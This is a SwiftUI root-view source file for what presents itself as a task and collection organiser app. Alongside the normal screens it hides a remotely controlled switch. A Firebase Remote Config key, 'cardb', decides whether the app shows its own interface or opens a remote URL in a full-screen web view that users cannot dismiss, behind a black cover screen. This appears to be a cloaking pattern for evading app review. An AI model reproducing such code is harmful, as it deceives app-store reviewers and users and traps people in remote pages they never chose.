import AdSupport
import AppTrackingTransparency
import FirebaseRemoteConfig
import Foundation
import SwiftUI

enum AppStage {
    case loading
    case onboarding
    case main
}


extension Notification.Name {
    static let remoteConfigUpdated = Notification.Name("remoteConfigUpdated")
}

struct AddTaskRoute: Identifiable {
    let id = UUID()
    let mode: AddTaskMode
}

struct AddCollectionRoute: Identifiable {
    let id = UUID()
    let mode: AddCollectionMode
}

enum AddCollectionMode: Equatable {
    case create
    case edit(CollectionItem)
}

struct RootView: View {
    @StateObject private var model = TasksModel()
    @State private var addRoute: AddCollectionRoute? = nil
    @AppStorage("onboarding_done") private var onboardingDone = false
    @State private var stage: AppStage = .loading

    
    struct WebItem: Identifiable, Equatable {
           let id = UUID()
           let url: URL
       }

       @State private var webItem: WebItem? = nil
       @State private var showBlackout: Bool = true
       @Environment(\.scenePhase) private var scenePhase

       @State private var openedURLString: String? = nil
       @State private var didHandleEmpty = false
       @State private var didRequestATT = false
    
    @State private var showSettings = false

    var body: some View {
        ZStack{
            Group {
                switch stage {
                case .loading:
                    Loading {
                        stage = onboardingDone ? .main : .onboarding
                    }
                    
                case .onboarding:
                    Onboarding {
                        onboardingDone = true
                        stage = .main
                    }
                    
                case .main:
                    ZStack {
                        Main(
                            onOpenSettings: { showSettings = true },
                            onOpenAddNew: { addRoute = .init(mode: .create) },
                            onEditTask: { col in addRoute = .init(mode: .edit(col))
                            }
                        )
                        .environmentObject(model)
                    }
                    .fullScreenCover(isPresented: $showSettings) {
                        Setting()
                    }
                    .fullScreenCover(item: $addRoute) { route in
                        AddCollection(mode: route.mode)
                            .environmentObject(model)
                    }
                }
            }
            .animation(.easeInOut, value: stage)
            
            if showBlackout {
                           Color.black
                               .ignoresSafeArea()
                               .transition(.opacity)
                               .allowsHitTesting(true)
                       }
            
        }
        
       
               .onAppear {

                   checkRemoteURLAndOpen()
               }

               .onReceive(
                   NotificationCenter.default.publisher(for: .remoteConfigUpdated)
               ) { _ in
                   checkRemoteURLAndOpen()
               }

               .fullScreenCover(item: $webItem) { item in
                   CardView(url: item.url)
                       .ignoresSafeArea()
                       .interactiveDismissDisabled(true)
               }
               .transaction { t in
                   t.disablesAnimations = true
               }
    }
    
    private func checkRemoteURLAndOpen() {
           let value = RCService.rc["cardb"].stringValue
               .trimmingCharacters(in: .whitespacesAndNewlines)

           if value.isEmpty {
               guard !didHandleEmpty else {

                   return
               }
               didHandleEmpty = true

               withAnimation(.easeInOut(duration: 0.5)) { showBlackout = false }

               if !didRequestATT {
                   didRequestATT = true
                   requestATTIfNeeded()
               }
               return
           }

           guard let url = URL(string: value) else {

               return
           }

           if openedURLString == url.absoluteString {

               return
           }

           DispatchQueue.main.async {

               self.webItem = WebItem(url: url)
               self.openedURLString = url.absoluteString

           }
       }

       private func requestATTIfNeeded() {
           DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
               guard #available(iOS 14, *) else { return }

               let status = ATTrackingManager.trackingAuthorizationStatus
               guard status == .notDetermined else { return }

               ATTrackingManager.requestTrackingAuthorization { status in
                   switch status {
                   case .authorized:
                       print(
                           "✅ ATT authorized. IDFA:",
                           ASIdentifierManager.shared().advertisingIdentifier
                       )
                   case .denied:
                       print("❌ ATT denied")
                   case .notDetermined:
                       print("⚠️ ATT still notDetermined")
                   case .restricted:
                       print("⛔️ ATT restricted")
                   @unknown default:
                       print("❓ ATT unknown status:", status.rawValue)
                   }
               }
           }
       }
}
